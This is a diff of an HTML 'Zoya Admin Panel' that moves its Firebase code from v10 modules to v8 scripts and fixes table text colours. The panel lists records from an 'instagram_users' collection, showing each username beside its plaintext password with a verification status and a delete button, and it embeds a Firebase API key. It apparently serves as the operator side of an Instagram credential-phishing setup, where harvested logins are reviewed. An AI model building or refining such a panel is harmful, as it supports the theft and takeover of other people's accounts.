@@ -3,6 +3,10 @@
 <head>
   <title>🔥 Zoya Admin Panel</title>
 
+  <!-- Firebase v8 (GitHub safe) -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+
   <!-- Font -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
 
@@ -14,6 +18,7 @@
       color: #fff;
     }
 
+    /* ✅ SAFE gradient only for heading */
     h2 {
       text-align: center;
       margin-top: 20px;
@@ -26,8 +31,7 @@
     .container {
       width: 90%;
       margin: 30px auto;
-      background: rgba(0,0,0,0.5);
-      backdrop-filter: blur(10px);
+      background: rgba(0,0,0,0.6);
       border-radius: 15px;
       padding: 20px;
       box-shadow: 0 0 25px rgba(0,0,0,0.6);
@@ -45,8 +49,8 @@
       border: 1px solid #00f2fe;
       outline: none;
       width: 220px;
-      background: rgba(0,0,0,0.6);
-      color: white;
+      background: rgba(0,0,0,0.7);
+      color: #ffffff;
     }
 
     input::placeholder {
@@ -56,7 +60,7 @@
     table {
       width: 100%;
       border-collapse: collapse;
-      background: rgba(0,0,0,0.7);
+      background: rgba(0,0,0,0.8);
       border-radius: 10px;
       overflow: hidden;
     }
@@ -68,7 +72,6 @@
       text-transform: uppercase;
       font-size: 13px;
       letter-spacing: 1px;
-      text-shadow: 0 0 8px #00f2fe;
     }
 
     td {
@@ -116,6 +119,17 @@
       color: black;
     }
 
+    /* 🚨 FORCE FIX (main bug fix) */
+    td, th {
+      -webkit-text-fill-color: #ffffff !important;
+      color: #ffffff !important;
+    }
+
+    th {
+      color: #00f2fe !important;
+      -webkit-text-fill-color: #00f2fe !important;
+    }
+
   </style>
 </head>
 
@@ -144,54 +158,50 @@
 
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
+<script>
 const firebaseConfig = {
   apiKey: "AIzaSyAcc6qlrnYArscNXN7uyZc_MG5DxLxQNOI",
   authDomain: "vega-70de0.firebaseapp.com",
-  projectId: "vega-70de0",
-  storageBucket: "vega-70de0.appspot.com",
-  messagingSenderId: "461552169149",
-  appId: "1:461552169149:web:8fd04f085bafaee67cc7d4"
+  projectId: "vega-70de0"
 };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
 const tableBody = document.querySelector("#userTable tbody");
 
-async function loadUsers() {
+function loadUsers() {
   tableBody.innerHTML = "";
-  const snapshot = await getDocs(collection(db, "instagram_users"));
 
-  snapshot.forEach((docSnap) => {
-    const data = docSnap.data();
-    const statusClass = data.status === "pending" ? "pending" : "verified";
+  db.collection("instagram_users").get().then((snapshot) => {
+    snapshot.forEach((doc) => {
+      const data = doc.data();
+      const statusClass = data.status === "pending" ? "pending" : "verified";
 
-    const row = document.createElement("tr");
+      const row = document.createElement("tr");
 
-    row.innerHTML = `
-      <td>${data.username || ""}</td>
-      <td>${data.password || ""}</td>
-      <td><span class="status ${statusClass}">${data.status}</span></td>
-      <td>${data.verified}</td>
-      <td><button class="btn-delete" onclick="deleteUser('${docSnap.id}')">Delete</button></td>
-    `;
+      row.innerHTML = `
+        <td>${data.username || ""}</td>
+        <td>${data.password || ""}</td>
+        <td><span class="status ${statusClass}">${data.status}</span></td>
+        <td>${data.verified}</td>
+        <td><button class="btn-delete" onclick="deleteUser('${doc.id}')">Delete</button></td>
+      `;
 
-    tableBody.appendChild(row);
+      tableBody.appendChild(row);
+    });
   });
 }
 
-window.deleteUser = async (id) => {
+function deleteUser(id) {
   if (confirm("Delete this user?")) {
-    await deleteDoc(doc(db, "instagram_users", id));
-    loadUsers();
+    db.collection("instagram_users").doc(id).delete().then(() => {
+      loadUsers();
+    });
   }
-};
+}
 
-window.filterUsers = () => {
+function filterUsers() {
   const input = document.getElementById("search").value.toLowerCase();
   const rows = document.querySelectorAll("#userTable tbody tr");
 
@@ -199,10 +209,9 @@ window.filterUsers = () => {
     const username = row.children[0].textContent.toLowerCase();
     row.style.display = username.includes(input) ? "" : "none";
   });
-};
+}
 
 loadUsers();
-
 </script>
 
 </body>
